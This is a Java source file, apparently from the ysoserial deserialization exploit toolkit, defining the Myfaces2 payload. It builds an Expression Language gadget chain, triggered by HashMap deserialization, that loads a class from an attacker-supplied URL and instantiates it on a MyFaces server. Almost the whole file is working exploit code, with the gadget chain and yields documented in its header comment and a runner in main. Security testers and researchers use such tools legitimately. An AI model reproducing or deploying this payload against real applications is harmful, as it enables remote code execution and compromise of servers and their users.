package ysoserial.payloads;



import java.net.URL;

import ysoserial.annotation.Bind;
import ysoserial.interfaces.ObjectPayload;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;


/**
 * 
 * ValueExpressionImpl.getValue(ELContext)
 * ValueExpressionMethodExpression.getMethodExpression(ELContext)
 * ValueExpressionMethodExpression.getMethodExpression()
 * ValueExpressionMethodExpression.hashCode()
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)
 * 
 * Arguments:
 * - base_url:classname
 * 
 * Yields:
 * - Instantiation of remotely loaded class
 * 
 * Requires:
 * - MyFaces
 * - Matching EL impl (setup POM deps accordingly, so that the ValueExpression can be deserialized)
 * 
 * @author mbechler
 */
@PayloadTest ( harness = "ysoserial.payloads.MyfacesTest" )
public class Myfaces2 implements ObjectPayload<Object>, DynamicDependencies {
	
	@Bind private URL url;
	@Bind private String className;
    
    public static String[] getDependencies () {
        return Myfaces1.getDependencies();
    }
    

    /**
	 * @deprecated Use {@link #getObject()} instead
	 */
	public Object getObject ( String command ) throws Exception {
		return getObject();
	}


	public Object getObject ( ) throws Exception {
        // based on http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/
        String expr = "${request.setAttribute('arr',''.getClass().forName('java.util.ArrayList').newInstance())}";
        
        // if we add fewer than the actual classloaders we end up with a null entry
        for ( int i = 0; i < 100; i++ ) {
            expr += "${request.getAttribute('arr').add(request.servletContext.getResource('/').toURI().create('" + url + "').toURL())}";
        }
        expr += "${request.getClass().getClassLoader().newInstance(request.getAttribute('arr')"
                + ".toArray(request.getClass().getClassLoader().getURLs())).loadClass('" + className + "').newInstance()}";
        
        return Myfaces1.makeExpressionPayload(expr);
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(Myfaces2.class, args);
    }
}
